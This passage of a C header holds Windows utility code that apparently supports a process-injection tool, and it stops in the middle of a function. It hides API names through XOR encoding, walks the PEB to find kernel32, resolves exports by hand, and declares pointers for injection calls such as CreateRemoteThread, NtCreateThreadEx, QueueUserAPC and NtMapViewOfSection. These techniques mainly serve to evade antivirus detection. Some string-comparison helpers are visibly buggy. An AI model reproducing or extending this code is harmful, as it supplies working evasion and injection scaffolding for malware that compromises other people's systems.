#pragma once

#include <Windows.h>
#include <TlHelp32.h>
#include <winternl.h>

typedef struct _client_id
{
    HANDLE hUniqueProcess;
    HANDLE hUniqueThread;
} MY_CLIENT_ID, *PMY_CLIENT_ID;

typedef struct _peb_ldr_data
{
#ifdef _M_X64
    BYTE Dummy[32];
#else
    BYTE Dummy[20];
#endif
    LIST_ENTRY InMemoryOrderModuleList;
} MY_PEB_LDR_DATA;

typedef struct _peb
{
#ifdef _M_X64
    BYTE Dummy[16];
    PVOID64 ImageBaseAddress;
#else
    BYTE Dummy[8];
    PVOID ImageBaseAddress;
#endif
    MY_PEB_LDR_DATA *Ldr;
} MY_PEB;

typedef struct _unicode_string
{
    USHORT Length;
    USHORT MaxLength;
    PWSTR Buffer;
} MY_UNICODE_STRING, *PMY_UNICODE_STRING;

typedef struct _ldr_data_table_entry
{
#ifdef _M_X64
    BYTE Dummy[48];
    PVOID64 pvDllBase;
    PVOID64 EntryPoint;
    DWORD64 SizeOfImage;
#else
    BYTE Dummy[24];
    PVOID pvDllBase;
    PVOID EntryPoint;
    DWORD32 SizeOfImage;
#endif
    MY_UNICODE_STRING FullDllName;
    MY_UNICODE_STRING BaseDllName;
} MY_LDR_DATA_TABLE_ENTRY;

typedef struct _object_attributes
{
    ULONG Length;
    HANDLE RootDirectory;
    PMY_UNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} MY_OBJECT_ATTRIBUTES, *PMY_OBJECT_ATTRIBUTES;

typedef enum _SECTION_INHERIT
{
    ViewShare = 1,
    ViewUnmap = 2,
} MY_SECTION_INHERIT,
    *PMY_SECTION_INHERIT;

// XORed version of the strings
char cKernel32[] = {0x5b, 0x55, 0x42, 0x5e, 0x55, 0x5c, 0x3, 0x2, 0x1e, 0x54, 0x5c, 0x5c, 0};
const short cKernel32Len = 12;
char cNTDLL[] = {0x5e, 0x44, 0x54, 0x5c, 0x5c, 0x1e, 0x54, 0x5c, 0x5c, 0};
const short cNTDLLLen = 9;

char key[] = {0x30, 0x30, 0x30, 0x30, 0x30, 0};
const short key_len = 5;

HMODULE(WINAPI *pLoadLibraryA)
(LPCSTR lpLibFileName);

HFILE(WINAPI *pOpenFile)
(LPCSTR lpFileName, LPOFSTRUCT lpReOpenBuff, UINT uStyle);

DWORD(WINAPI *pGetLastError)
(void);

DWORD(WINAPI *pGetFileSize)
(HANDLE hFile, LPDWORD lpFileSizeHigh);

HANDLE(WINAPI *pCreateToolhelp32Snapshot)
(DWORD dwFlags, DWORD th32ProcessID);

BOOL(WINAPI *pProcess32First)
(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);

BOOL(WINAPI *pProcess32Next)
(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);

BOOL(WINAPI *pThread32First)
(HANDLE hSnapShot, LPTHREADENTRY32 lpte);

BOOL(WINAPI *pThread32Next)
(HANDLE hSnapShot, LPTHREADENTRY32 lpte);

HMODULE(WINAPI *pGetModuleHandleA)
(LPCSTR lpModuleName);

HANDLE(WINAPI *pGetCurrentProcess)
(void);

HANDLE(WINAPI *pCreateFileA)
(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwSharedMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);

BOOL(WINAPI *pWriteFile)
(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);

BOOL(WINAPI *pCreateProcessA)
(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);

HANDLE(WINAPI *pOpenProcess)
(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);

FARPROC(WINAPI *pGetProcAddress)
(HMODULE hModule, LPCSTR lpProcName);

LPVOID(WINAPI *pVirtualAlloc)
(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

LPVOID(WINAPI *pVirtualAllocEx)
(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

BOOL(WINAPI *pVirtualProtect)
(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);

BOOL(WINAPI *pVirtualProtectEx)
(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);

BOOL(WINAPI *pReadProcessMemory)
(HANDLE hProcess, LPCVOID lpvAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);

BOOL(WINAPI *pWriteProcessMemory)
(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);

BOOL(WINAPI *pVirtualFree)
(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);

BOOL(WINAPI *pVirtualFreeEx)
(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);

BOOL(WINAPI *pReadFile)
(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberofBytesRead, LPOVERLAPPED lpOverlapped);

HANDLE(WINAPI *pOpenThread)
(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId);

HANDLE(WINAPI *pCreateThread)
(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);

HANDLE(WINAPI *pCreateRemoteThread)
(HANDLE hProcess, LPSECURITY_ATTRIBUTES lppThreadAttributes, DWORD dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPWORD lpThreadID);

DWORD(WINAPI *pWaitForSingleObject)
(HANDLE hHandle, DWORD dwMilliSeconds);

BOOL(WINAPI *pCloseHandle)
(HANDLE hObject);

DWORD(WINAPI *pSuspendThread)
(HANDLE hThread);

DWORD(WINAPI *pResumeThread)
(HANDLE hThread);

void(WINAPI *pSleep)(DWORD dwMilliseconds);

BOOL(WINAPI *pGetThreadContext)
(HANDLE hThread, LPCONTEXT lpContext);

BOOL(WINAPI *pSetThreadContext)
(HANDLE hThread, const CONTEXT *lpContext);

DWORD(WINAPI *pQueueUserAPC)
(PAPCFUNC pfnAPC, HANDLE hThread, ULONG_PTR dwData);

LONG(NTAPI *pNTCreateThreadEx)
(PHANDLE hThread, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID lpStartAddress, PVOID lpParameter, ULONG Flags, SIZE_T StackZeroBits, SIZE_T SizeOfStackCommit, SIZE_T SizeOfStackReserve, PVOID lpBytesBuffer);

LONG(NTAPI *pRTLCreateUserThread)
(HANDLE hProcess, PSECURITY_DESCRIPTOR pSecurityDescriptor, BOOL bCreateSuspended, ULONG ulStackZeroBits, SIZE_T pulStackReserved, SIZE_T pulStackCommit, PVOID pvStartAddress, PVOID pvStartParameter, PHANDLE phThread, PMY_CLIENT_ID pClientID);

LONG(NTAPI *pNTCreateSection)
(HANDLE hSectionHandle, ACCESS_MASK DesiredAccess, PMY_OBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaxiumumInteger, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE hFile);

LONG(NTAPI *pNTMapViewOfSection)
(HANDLE hSection, HANDLE hProcess, PVOID pvBaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, MY_SECTION_INHERIT InheritDisposition, ULONG ulAllocationType, ULONG ulWin32Protect);

LONG(NTAPI *pNtQueryInformationProcess)
(HANDLE hProcess, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);

LONG(NTAPI *pNTFlushInstructionCache)
(HANDLE hProcess, PVOID pvBaseAddress, ULONG ulNumberOfBytesToFlush);

BOOL(WINAPI *pFreeLibrary)
(HMODULE hLibModule);

#ifdef UTILS_IMPLEMENTATION

size_t MyStrLen(CHAR *str)
{
    size_t strlen = 0;
    while (*str++ != 0)
    {
        ++strlen;
    }

    return strlen;
}

size_t MyWStrLen(WCHAR *wstr)
{
    size_t wstrlen = 0;
    while (*wstr++ != 0)
    {
        ++wstrlen;
    }

    return wstrlen;
}

void MyMemCpy(BYTE *Dst, BYTE *Src, SIZE_T NumBytes)
{
    for (SIZE_T b = 0; b < NumBytes; ++b)
    {
        Dst[b] = Src[b];
    }
}

void MyXor(BYTE *data, SIZE_T data_len, BYTE *key, SIZE_T key_len)
{
    DWORD32 j = 0;

    for (SIZE_T i = 0; i < data_len; ++i)
    {
        if (j == key_len)
            j = 0;

        BYTE bInput = 0;

        for (BYTE b = 0; b < 8; ++b)
        {
            BYTE data_bit_i = _bittest((LONG *)&data[i], b);
            BYTE key_bit_j = _bittest((LONG *)&key[j], b);

            BYTE bit_xor = (data_bit_i != key_bit_j) << b;

            bInput |= bit_xor;
        }

        data[i] = bInput;

        ++j;
    }
}

BOOL MyStrCmpiAW(CHAR *sStr1, WCHAR *sStr2)
{
    BOOL bAreEqual = TRUE;

    for (size_t c = 0; c < MyStrLen(sStr1); ++c)
    {
        if (sStr1[c] != sStr2[c])
        {
            if (sStr1[c] < sStr2[c])
            {
                if ((sStr1[c] + 32) != sStr2[c])
                {
                    bAreEqual = FALSE;
                    break;
                }
            }
            else if (sStr2[c] < sStr2[c])
            {
                if ((sStr2[c] + 32) != sStr1[c])
                {
                    bAreEqual = FALSE;
                    break;
                }
            }
        }
    }

    return bAreEqual;
}

BOOL MyStrCmpiAA(CHAR *sStr1, CHAR *sStr2)
{
    BOOL bAreEqual = TRUE;

    size_t sStr1Len = MyStrLen(sStr1);
    size_t sStr2Len = MyStrLen(sStr2);

    if (sStr1Len > sStr2Len)
    {
        for (size_t c = 0; c < MyStrLen(sStr1); ++c)
        {
            if (sStr1[c] != sStr2[c])
            {
                if (sStr1[c] < sStr2[c])
                {
                    if ((sStr1[c] + 32) != sStr2[c])
                    {
                        bAreEqual = FALSE;
                        break;
                    }
                }
                else if (sStr1[c] > sStr2[c])
                {
                    if (sStr1[c] != (sStr2[c] + 32))
                    {
                        bAreEqual = FALSE;
                        break;
                    }
                }
            }
        }
    }
    else
    {
        for (size_t c = 0; c < MyStrLen(sStr2); ++c)
        {
            if (sStr1[c] != sStr2[c])
            {
                if (sStr1[c] < sStr2[c])
                {
                    if ((sStr1[c] + 32) != sStr2[c])
                    {
                        bAreEqual = FALSE;
                        break;
                    }
                }
                else if (sStr1[c] > sStr2[c])
                {
                    if (sStr1[c] != (sStr2[c] + 32))
                    {
                        bAreEqual = FALSE;
                        break;
                    }
                }
            }
        }
    }

    return bAreEqual;
}

CHAR *MyStrDup(CHAR *sStr)
{
    size_t sStrLen = MyStrLen(sStr);

    CHAR *sDup = pVirtualAlloc(0, sStrLen, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    for (size_t c = 0; c < sStrLen; ++c)
    {
        sDup[c] = sStr[c];
    }

    return sDup;
}

CHAR *MyStrChr(CHAR *sStr, int iCh)
{
    CHAR *cRet = NULL;

    size_t sStrLen = MyStrLen(sStr);

    for (size_t c = 0; c < sStrLen + 1; ++c)
    {
        if (sStr[c] == iCh)
        {
            cRet = sStr + c;
            break;
        }
    }

    return cRet;
}

CHAR *MyStrStr(CHAR *sStr1, CHAR *sStr2)
{
    return NULL;
}

LONG RVAToOffset(DWORD rva, IMAGE_SECTION_HEADER *SectionHeaders, WORD SectionHeaderCount)
{
    for (WORD id = 0; id < SectionHeaderCount; ++id)
    {
        if (rva >= SectionHeaders[id].VirtualAddress && rva < SectionHeaders[id].VirtualAddress + SectionHeaders[id].SizeOfRawData)
        {
            return rva - SectionHeaders[id].VirtualAddress + SectionHeaders[id].PointerToRawData;
        }
    }

    return -1;
}

HMODULE MyGetKernelModuleHandle(void)
{
#ifdef _M_X64
    PEB *pPeb = (PEB *)__readgsqword(0x60);
#else
    PEB *pPeb = (PEB *)__readfsdword(0x30);
#endif

    LIST_ENTRY *FirstListEntry = &pPeb->Ldr->InMemoryOrderModuleList;
    LIST_ENTRY *CurrentListEntry = FirstListEntry->Flink;

    char cKernelDLL[] = {0x5b, 0x55, 0x42, 0x5e, 0x55, 0x5c, 0x3, 0x2, 0x1e, 0x54, 0x5c, 0x5c, 0};
    MyXor(cKernelDLL, 12, key, key_len);

    while (CurrentListEntry != FirstListEntry)
    {
        MY_LDR_DATA_TABLE_ENTRY *TableEntry = (MY_LDR_DATA_TABLE_ENTRY *)((ULONG_PTR)CurrentListEntry - sizeof(LIST_ENTRY));

        if (MyStrCmpiAW(cKernelDLL, TableEntry->BaseDllName.Buffer))
        {
            return (HMODULE)TableEntry->pvDllBase;
        }

        CurrentListEntry = CurrentListEntry->Flink;
    }

    return NULL;
}

LPVOID MyGetProcAddressByName(ULONG_PTR ulModuleAddr, CHAR *sProcName)
{
    IMAGE_DOS_HEADER *DosHeader = (IMAGE_DOS_HEADER *)ulModuleAddr;
    IMAGE_NT_HEADERS *NTHeaders = (IMAGE_NT_HEADERS *)(ulModuleAddr + DosHeader->e_lfanew);

    IMAGE_DATA_DIRECTORY ExportDataDirectory = NTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    IMAGE_EXPORT_DIRECTORY *ExportDirectory = (IMAGE_EXPORT_DIRECTORY *)(ulModuleAddr + ExportDataDirectory.VirtualAddress);

    DWORD *AddressOfFunctions = (DWORD *)(ulModuleAddr + ExportDirectory->AddressOfFunctions);
    DWORD *AddressOfNames = (DWORD *)(ulModuleAddr + ExportDirectory->AddressOfNames);
    WORD *AddressOfNameOrdinals = (WORD *)(ulModuleAddr + ExportDirectory->AddressOfNameOrdinals);

    ULONG_PTR lpvProcAddr = NULL;
    for (DWORD n = 0; n < ExportDirectory->NumberOfNames; ++n)
    {
        if (MyStrCmpiAA(sProcName, (ulModuleAddr + AddressOfNames[n])))
        {
            lpvProcAddr = (ULONG_PTR)(ulModuleAddr + AddressOfFunctions[AddressOfNameOrdinals[n]]);
            break;
        }
    }

    if ((lpvProcAddr > (ulModuleAddr + ExportDataDirectory.VirtualAddress)) && (lpvProcAddr <= (ulModuleAddr + ExportDataDirectory.VirtualAddress + ExportDataDirectory.Size)))
    {
        char *DLLFunctionName = MyStrDup(lpvProcAddr);
        char *FunctionName = MyStrChr(DLLFunctionName, '.');

        *FunctionName = 0;
        ++FunctionName;

        HMODULE ForwardedDLL = pLoadLibraryA(DLLFunctionName);
        lpvProcAddr = MyGetProcAddressByName((ULONG_PTR)ForwardedDLL, FunctionName);

        pVirtualFree(DLLFunctionName, 0, MEM_RELEASE);
    }

    return (LPVOID)lpvProcAddr;
}

LPVOID MyGetProcAddressByOrdinal(ULONG_PTR ulModuleAddr, WORD wOrdinal)
{
    IMAGE_DOS_HEADER *DosHeader = (IMAGE_DOS_HEADER *)ulModuleAddr;
    IMAGE_NT_HEADERS *NTHeaders = (IMAGE_NT_HEADERS *)(ulModuleAddr + DosHeader->e_lfanew);

    IMAGE_DATA_DIRECTORY ExportDataDirectory = NTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    IMAGE_EXPORT_DIRECTORY *ExportDirectory = (IMAGE_EXPORT_DIRECTORY *)(ulModuleAddr + ExportDataDirectory.VirtualAddress);

    DWORD *AddressOfFunctions = (DWORD *)(ulModuleAddr + ExportDirectory->AddressOfFunctions);
    DWORD *AddressOfNames = (DWORD *)(ulModuleAddr + ExportDirectory->AddressOfNames);
    WORD *AddressOfNameOridinals = (WORD *)(ulModuleAddr + ExportDirectory->AddressOfNameOrdinals);

    BYTE *lpvProcAddr = NULL;

    if ((wOrdinal < (WORD)ExportDirectory->Base) && (wOrdinal >= (WORD)ExportDirectory->Base + ExportDirectory->NumberOfFunctions))
    {
        return lpvProcAddr;
    }

    lpvProcAddr = (BYTE *)(ulModuleAddr + AddressOfFunctions[wOrdinal - ExportDirectory->Base]);

    if ((lpvProcAddr > (ulModuleAddr + ExportDataDirectory.VirtualAddress)) && (lpvProcAddr <= (ulModuleAddr + ExportDataDirectory.VirtualAddress + ExportDataDirectory.Size)))
    {
        char *DLLFunctionName = MyStrDup(lpvProcAddr);
        char *FunctionName = MyStrChr(DLLFunctionName, '.');

        *FunctionName = 0;
        ++FunctionName;

        HMODULE ForwardedDLL = pLoadLibraryA(DLLFunctionName);
        lpvProcAddr = MyGetProcAddressByName((ULONG_PTR)ForwardedDLL, FunctionName);

        pVirtualFree(DLLFunctionName, 0, MEM_RELEASE);
    }

    return (LPVOID)lpvProcAddr;
}

void PopulateKernelFunctionPtrsByName(LPVOID lpvKernelDLL)
{
    char cOpenFile[] = {0x7f, 0x40, 0x55, 0x5e, 0x76, 0x59, 0x5c, 0x55, 0};
    MyXor(cOpenFile, 8, key, key_len);
    pOpenFile = MyGetProcAddressByName(lpvKernelDLL, cOpenFile);

    char cLoadLibraryA[] = {0x7c, 0x5f, 0x51, 0x54, 0x7c, 0x59, 0x52, 0x42, 0x51, 0x42, 0x49, 0x71, 0};
    MyXor(cLoadLibraryA, 12, key, key_len);
    pLoadLibraryA = MyGetProcAddressByName(lpvKernelDLL, cLoadLibraryA);

    char cGetFileSize[] = {0x77, 0x55, 0x44, 0x76, 0x59, 0x5c, 0x55, 0x63, 0x59, 0x4a, 0x55, 0};
    MyXor(cGetFileSize, 11, key, key_len);
    pGetFileSize = MyGetProcAddressByName(lpvKernelDLL, cGetFileSize);

    char cCreateToolhelpSnapshot32[] = {0x73, 0x42, 0x55, 0x51, 0x44, 0x55, 0x64, 0x5f, 0x5f, 0x5c, 0x58, 0x55, 0x5c, 0x40, 0x3, 0x2, 0x63, 0x5e, 0x51, 0x40, 0x43, 0x58, 0x5f, 0x44, 0};
    MyXor(cCreateToolhelpSnapshot32, 24, key, key_len);
    pCreateToolhelp32Snapshot = MyGetProcAddressByName(lpvKernelDLL, cCreateToolhelpSnapshot32);

    char cProcess32First[] = {0x60, 0x42, 0x5f, 0x53, 0x55, 0x43, 0x43, 0x3, 0x2, 0x76, 0x59, 0x42, 0x43, 0x44, 0};
    MyXor(cProcess32First, 14, key, key_len);
    pProcess32First = MyGetProcAddressByName(lpvKernelDLL, cProcess32First);

    char cProcess32Next[] = {0x60, 0x42, 0x5f, 0x53, 0x55, 0x43, 0x43, 0x3, 0x2, 0x7e, 0x55, 0x48, 0x44, 0};
    MyXor(cProcess32Next, 13, key, key_len);
    pProcess32Next = MyGetProcAddressByName(lpvKernelDLL, cProcess32Next);

    char cThread32First[] = {0x64, 0x58, 0x42, 0x55, 0x51, 0x54, 0x3, 0x2, 0x76, 0x59, 0x42, 0x43, 0x44, 0};
    MyXor(cThread32First, 13, key, key_len);
    pThread32First = MyGetProcAddressByName(lpvKernelDLL, cThread32First);

    char cThread32Next[] = {0x64, 0x58, 0x42, 0x55, 0x51, 0x54, 0x3, 0x2, 0x7e, 0x55, 0x48, 0x44, 0};
    MyXor(cThread32Next, 12, key, key_len);
    pThread32Next = MyGetProcAddressByName(lpvKernelDLL, cThread32Next);

    char cGetModuleHandleA[] = {0x77, 0x55, 0x44, 0x7d, 0x5f, 0x54, 0x45, 0x5c, 0x55, 0x78, 0x51, 0x5e, 0x54, 0x5c, 0x55, 0x71, 0};
    MyXor(cGetModuleHandleA, 16, key, key_len);
    pGetModuleHandleA = MyGetProcAddressByName(lpvKernelDLL, cGetModuleHandleA);

    char cGetCurrentProcess[] = {0x77, 0x55, 0x44, 0x73, 0x45, 0x42, 0x42, 0x55, 0x5e, 0x44, 0x60, 0x42, 0x5f, 0x53, 0x55, 0x43, 0x43, 0};
    MyXor(cGetCurrentProcess, 17, key, key_len);
    pGetCurrentProcess = MyGetProcAddressByName(lpvKernelDLL, cGetCurrentProcess);

    char cCreateProcess[] = {0x73, 0x42, 0x55, 0x51, 0x44, 0x55, 0x60, 0x42, 0x5f, 0x53, 0x55, 0x43, 0x43, 0x71, 0};
    MyXor(cCreateProcess, 14, key, key_len);
    pCreateProcessA = MyGetProcAddressByName(lpvKernelDLL, cCreateProcess);

    char cOpenProcess[] = {0x7f, 0x40, 0x55, 0x5e, 0x60, 0x42, 0x5f, 0x53, 0x55, 0x43, 0x43, 0};
    MyXor(cOpenProcess, 11, key, key_len);
    pOpenProcess = MyGetProcAddressByName(lpvKernelDLL, cOpenProcess);

    char cOpenThread[] = {0x7f, 0x40, 0x55, 0x5e, 0x64, 0x58, 0x42, 0x55, 0x51, 0x54, 0};
    MyXor(cOpenThread, 10, key, key_len);
    pOpenThread = MyGetProcAddressByName(lpvKernelDLL, cOpenThread);

    char cVirtualAlloc[] = {0x66, 0x59, 0x42, 0x44, 0x45, 0x51, 0x5c, 0x71, 0x5c, 0x5c, 0x5f, 0x53, 0};
    MyXor(cVirtualAlloc, 12, key, key_len);
    pVirtualAlloc = MyGetProcAddressByName(lpvKernelDLL, cVirtualAlloc);

    char cVirtualAllocEx[] = {0x66, 0x59, 0x42, 0x44, 0x45, 0x51, 0x5c, 0x71, 0x5c, 0x5c, 0x5f, 0x53, 0x75, 0x48, 0};
    MyXor(cVirtualAllocEx, 14, key, key_len);
    pVirtualAllocEx = MyGetProcAddressByName(lpvKernelDLL, cVirtualAllocEx);

    char cReadProcessMemory[] = {0x62, 0x55, 0x51, 0x54, 0x60, 0x42, 0x5f, 0x53, 0x55, 0x43, 0x43, 0x7d, 0x55, 0x5d, 0x5f, 0x42, 0x49, 0x0};
    MyXor(cReadProcessMemory, 17, key, key_len);
    pReadProcessMemory = MyGetProcAddressByName(lpvKernelDLL, cReadProcessMemory);

    char cWriteProcessMemory[] = {0x67, 0x42, 0x59, 0x44, 0x55, 0x60, 0x42, 0x5f, 0x53, 0x55, 0x43, 0x43, 0x7d, 0x55, 0x5d, 0x5f, 0x42, 0x49, 0};
    MyXor(cWriteProcessMemory, 18, key, key_len);
    pWriteProcessMemory = MyGetProcAddressByName(lpvKernelDLL, cWriteProcessMemory);

    char cReadFile[] = {0x62, 0x55, 0x51, 0x54, 0x76, 0x59, 0x5c, 0x55, 0};
    MyXor(cReadFile, 8, key, key_len);
    pReadFile = MyGetProcAddressByName(lpvKernelDLL, cReadFile);

    char cVirtualProtect[] = {0x66, 0x59, 0x42, 0x44, 0x45, 0x51, 0x5c, 0x60, 0x42, 0x5f, 0x44, 0x55, 0x53, 0x44, 0};
    MyXor(cVirtualProtect, 14, key, key_len);
    pVirtualProtect = MyGetProcAddressByName(lpvKernelDLL, cVirtualProtect);

    char cVirtualProtectEx[] = {0x66, 0x59, 0x42, 0x44, 0x45, 0x51, 0x5c, 0x60, 0x42, 0x5f, 0x44, 0x55, 0x53, 0x44, 0x75, 0x48, 0};
    MyXor(cVirtualProtectEx, 16, key, key_len);
    pVirtualProtectEx = MyGetProcAddressByName(lpvKernelDLL, cVirtualProtectEx);

    char cCreateThread[] = {0x73, 0x42, 0x55, 0x51, 0x44, 0x55, 0x64, 0x58, 0x42, 0x55, 0x51, 0x54, 0};
    MyXor(cCreateThread, 12, key, key_len);
    pCreateThread = MyGetProcAddressByName(lpvKernelDLL, cCreateThread);

    char cCreateRemoteThread[] = {0x73, 0x42, 0x55, 0x51, 0x44, 0x55, 0x62, 0x55, 0x5d, 0x5f, 0x44, 0x55, 0x64, 0x58, 0x42, 0x55, 0x51, 0x54, 0};
    MyXor(cCreateRemoteThread, 18, key, key_len);
    pCreateRemoteThread = MyGetProcAddressByName(lpvKernelDLL, cCreateRemoteThread);

    char cWaitForSingleObject[] = {0x67, 0x51, 0x59, 0x44, 0x76, 0x5f, 0x42, 0x63, 0x59, 0x5e, 0x57, 0x5c, 0x55, 0x7f, 0x52, 0x5a, 0x55, 0x53, 0x44, 0};
    MyXor(cWaitForSingleObject, 19, key, key_len);
    pWaitForSingleObject = MyGetProcAddressByName(lpvKernelDLL, cWaitForSingleObject);

    char cVirtualFree[] = {0x66, 0x59, 0x42, 0x44, 0x45, 0x51, 0x5c, 0x76, 0x42, 0x55, 0x55, 0};
    MyXor(cVirtualFree, 11, key, key_len);
    pVirtualFree = MyGetProcAddressByName(lpvKernelDLL, cVirtualFree);

    char cCloseHandle[] = {0x73, 0x5c, 0x5f, 0x43, 0x55, 0x78, 0x51, 0x5e, 0x54, 0x5c, 0x55, 0};
    MyXor(cCloseHandle, 11, key, key_len);
    pCloseHandle = MyGetProcAddressByName(lpvKernelDLL, cCloseHandle);

    char cSuspendThread[] = {0x63, 0x45, 0x43, 0x40, 0x55, 0x5e, 0x54, 0x64, 0x58, 0x42, 0x55, 0x51, 0x54, 0};
    MyXor(cSuspendThread, 13, key, key_len);
    pSuspendThread = MyGetProcAddressByName(lpvKernelDLL, cSuspendThread);

    char cResumeThread[] = {0x62, 0x55, 0x43, 0x45, 0x5d, 0x55, 0x64, 0x58, 0x42, 0x55, 0x51, 0x54, 0};
    MyXor(cResumeThread, 12, key, key_len);
    pResumeThread = MyGetProcAddressByName(lpvKernelDLL, cResumeThread);

    char cSleep[] = {0x63, 0x5c, 0x55, 0x55, 0x40, 0x0};
    MyXor(cSleep, 5, key, key_len);
    pSleep = MyGetProcAddressByName(lpvKernelDLL, cSleep);

    char cGetThreadContext[] = {0x77, 0x55, 0x44, 0x64, 0x58, 0x42, 0x55, 0x51, 0x54, 0x73, 0x5f, 0x5e, 0x44, 0x55, 0x48, 0x44, 0};
    MyXor(cGetThreadContext, 16, key, key_len);
    pGetThreadContext = MyGetProcAddressByName(lpvKernelDLL, cGetThreadContext);

    char cSetThreadContext[] = {0x63, 0x55, 0x44, 0x64, 0x58, 0x42, 0x55, 0x51, 0x54, 0x73, 0x5f, 0x5e, 0x44, 0x55, 0x48, 0x44, 0};
    MyXor(cSetThreadContext, 16, key, key_len);
    pSetThreadContext = MyGetProcAddressByName(lpvKernelDLL, cSetThreadContext);

    char cQueueUserAPC[] = {0x61, 0x45, 0x55, 0x45, 0x55, 0x65, 0x43, 0x55, 0x42, 0x71, 0x60, 0x73, 0};
    MyXor(cQueueUserAPC, 12, key, key_len);
    pQueueUserAPC = MyGetProcAddressByName(lpvKernelDLL, cQueueUserAPC);

    char cFreeLibrary[] = {0x76, 0x42, 0x55, 0x55, 0x7c, 0x59, 0x52, 0x42, 0x51, 0x42, 0x49, 0};
    MyXor(cFreeLibrary, 11, key, key_len);
    pFreeLibrary = MyGetProcAddressByName(lpvKernelDLL, cFreeLibrary);

    char cGetProcAddress[] = {0x77, 0x55, 0x44, 0x60, 0x42, 0x5f, 0x53, 0x71, 0x54, 0x54, 0x42, 0x55, 0x43, 0x43, 0};
    MyXor(cGetProcAddress, 14, key, key_len);
    pGetProcAddress = MyGetProcAddressByName(lpvKernelDLL, cGetProcAddress);

    char cCreateFileA[] = {0x73, 0x42, 0x55, 0x51, 0x44, 0x55, 0x76, 0x59, 0x5c, 0x55, 0x71, 0};
    MyXor(cCreateFileA, 11, key, key_len);
    pCreateFileA = MyGetProcAddressByName(lpvKernelDLL, cCreateFileA);

    char cWriteFile[] = {0x67, 0x42, 0x59, 0x44, 0x55, 0x76, 0x59, 0x5c, 0x55, 0x0};
    MyXor(cWriteFile, 9, key, key_len);
    pWriteFile = MyGetProcAddressByName(lpvKernelDLL, cWriteFile);
}

BOOL IsImportDescriptorZero(IMAGE_IMPORT_DESCRIPTOR ImportDirectory)
{
    return ImportDirectory.OriginalFirstThunk == 0 &&
           ImportDirectory.TimeDateStamp == 0 &&
           ImportDirectory.ForwarderChain == 0 &&
           ImportDirectory.Name == 0 &&
           ImportDirectory.FirstThunk == 0;
}

void PopulateKernelFunctionPtrsByOrdinal(LPVOID lpvKernelDLL)
{
#ifdef _M_X64
    pOpenFile = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x408);
    pLoadLibraryA = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x3c9);
    pGetFileSize = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x256);
    pCreateToolhelp32Snapshot = MyGetProcAddressByOrdinal(lpvKernelDLL, 0xff);
    pProcess32First = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x431);
    pProcess32Next = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x433);
    pThread32First = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x5b0);
    pThread32Next = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x5b1);
    pGetCurrentProcess = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x221);
    pGetModuleHandleA = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x27f);
    pCreateProcessA = MyGetProcAddressByOrdinal(lpvKernelDLL, 0xe4);
    pOpenProcess = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x413);
    pOpenThread = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x41a);
    pVirtualAlloc = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x5db);
    pVirtualAllocEx = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x5dc);
    pWriteProcessMemory = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x630);
    pReadProcessMemory = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x47e);
    pReadFile = MyGetProcAddressByOrdinal(lpvKernelDLL, 0x47b);
